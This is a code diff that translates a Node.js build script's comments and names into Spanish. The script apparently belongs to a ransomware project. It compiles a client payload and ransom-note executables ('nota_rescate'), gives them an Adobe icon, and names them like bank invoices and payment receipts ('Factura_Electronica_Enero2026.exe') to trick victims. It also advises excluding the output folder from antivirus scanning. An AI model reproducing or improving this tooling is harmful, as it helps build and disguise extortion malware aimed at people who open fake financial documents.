@@ -4,13 +4,13 @@ const path = require('path');
 
 const distDir = path.join(__dirname, 'dist');
 
-// Ensure dist directory exists
+// Asegurar que el directorio dist exista
 if (!fs.existsSync(distDir)) {
     fs.mkdirSync(distDir, { recursive: true });
 }
 
-// Function to try to delete a file safely
-function tryDelete(filename) {
+// Funcion para intentar borrar un archivo de forma segura
+function intentarBorrar(filename) {
     const filePath = path.join(distDir, filename);
     if (!fs.existsSync(filePath)) return true;
     try {
@@ -21,17 +21,17 @@ function tryDelete(filename) {
     }
 }
 
-// Function to attempt build
-function runBuild(filename) {
+// Funcion para ejecutar la construccion
+function ejecutarConstruccion(filename) {
     console.log(`\n🔄 Intentando compilar a dist/${filename}...`);
 
-    // 1. Clean up potential previous file
-    if (!tryDelete(filename)) {
+    // 1. Limpiar archivo previo potencial
+    if (!intentarBorrar(filename)) {
         console.log(`⚠️  No se pudo borrar ${filename} (Bloqueado/En uso). Saltando...`);
         return false;
     }
 
-    // 2. Run pkg (Client)
+    // 2. Ejecutar pkg (Cliente)
     try {
         console.log(`   [NODE] Compilando Cliente...`);
         execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
@@ -40,21 +40,21 @@ function runBuild(filename) {
         return false;
     }
 
-    // 3. Run PyInstaller (Ransom Notes - TWO VERSIONS)
-    const iconRef = 'adobe_icon.ico';
-    const iconAbsPath = path.resolve(__dirname, iconRef);
-    const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
+    // 3. Ejecutar PyInstaller (Notas de Rescate - DOS VERSIONES)
+    const refIcono = 'adobe_icon.ico';
+    const rutaIconoAbs = path.resolve(__dirname, refIcono);
+    const argIcono = fs.existsSync(refIcono) ? `--icon="${rutaIconoAbs}"` : '';
 
     // === NOTA 1: VERSION PYQT6 (Windows 10/11) ===
-    const noteWin10 = 'Comprobante_Pago_2026';  // Para Win10/11
+    const notaWin10 = 'Comprobante_Pago_2026';  // Para Win10/11
     if (fs.existsSync('interfazdeaviso.py')) {
         try {
-            console.log(`   [PYTHON] Compilando Nota PyQt6 (${noteWin10}.exe) para Windows 10/11...`);
-            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
+            console.log(`   [PYTHON] Compilando Nota PyQt6 (${notaWin10}.exe) para Windows 10/11...`);
+            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${notaWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
             console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
         } catch (e) {
             try {
-                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
+                execSync(`pyinstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${notaWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
                 console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
             } catch (err) {
                 console.log(`   [PYTHON] Advertencia: No se pudo compilar nota PyQt6.`);
@@ -64,7 +64,7 @@ function runBuild(filename) {
         // === NOTA ADICIONAL: nota_rescate.exe (nombre simple) ===
         try {
             console.log(`   [PYTHON] Compilando nota_rescate.exe...`);
-            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_nota --specpath build/py_spec_nota --name "nota_rescate" interfazdeaviso.py`, { stdio: 'inherit' });
+            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_nota --specpath build/py_spec_nota --name "nota_rescate" interfazdeaviso.py`, { stdio: 'inherit' });
             console.log(`   [PYTHON] nota_rescate.exe compilada con exito.`);
         } catch (e) {
             console.log(`   [PYTHON] Advertencia: No se pudo compilar nota_rescate.exe`);
@@ -72,15 +72,15 @@ function runBuild(filename) {
     }
 
     // === NOTA 2: VERSION TKINTER (Windows 7/8/8.1) ===
-    const noteWin7 = 'Comprobante_Pago_2026_Legacy';  // Para Win7/8
+    const notaWin7 = 'Comprobante_Pago_2026_Legacy';  // Para Win7/8
     if (fs.existsSync('interfazdeaviso_tk.py')) {
         try {
-            console.log(`   [PYTHON] Compilando Nota Tkinter (${noteWin7}.exe) para Windows 7/8...`);
-            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
+            console.log(`   [PYTHON] Compilando Nota Tkinter (${notaWin7}.exe) para Windows 7/8...`);
+            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${notaWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
             console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
         } catch (e) {
             try {
-                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
+                execSync(`pyinstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${notaWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
                 console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
             } catch (err) {
                 console.log(`   [PYTHON] Advertencia: No se pudo compilar nota Tkinter.`);
@@ -105,37 +105,37 @@ function runBuild(filename) {
     return true;
 }
 
-// Main logic
+// Logica principal
 console.log(' Iniciando proceso de construccion inteligente...');
 
-// Kill any stuck instances first
+// Terminar instancias bloqueadas primero
 try {
     execSync('taskkill /F /IM cliente.exe', { stdio: 'ignore' });
 } catch (e) { }
 
-// List of preferred names to try in order (bank invoice style 2026)
-const candidates = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
-let built = false;
+// Lista de nombres preferidos a probar en orden (estilo factura bancaria 2026)
+const candidatos = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
+let construido = false;
 
-// Try candidates
-for (const name of candidates) {
-    if (runBuild(name)) {
-        built = true;
+// Probar candidatos
+for (const nombre of candidatos) {
+    if (ejecutarConstruccion(nombre)) {
+        construido = true;
         break;
     }
 }
 
-// Fallback to timestamp if all else fails
-if (!built) {
-    const timestampName = `cliente_${Date.now()}.exe`;
-    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${timestampName}`);
-    if (runBuild(timestampName)) {
-        built = true;
+// Fallback a timestamp si todo lo demas falla
+if (!construido) {
+    const nombreTimestamp = `cliente_${Date.now()}.exe`;
+    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${nombreTimestamp}`);
+    if (ejecutarConstruccion(nombreTimestamp)) {
+        construido = true;
     }
 }
 
-if (!built) {
-    console.error('\n💥 Todas las intentos de compilacion fallaron.');
+if (!construido) {
+    console.error('\n💥 Todos los intentos de compilacion fallaron.');
     console.error('💡 SUGERENCIA: Agrega la carpeta "dist" a las exclusiones de tu Antivirus.');
     process.exit(1);
 }
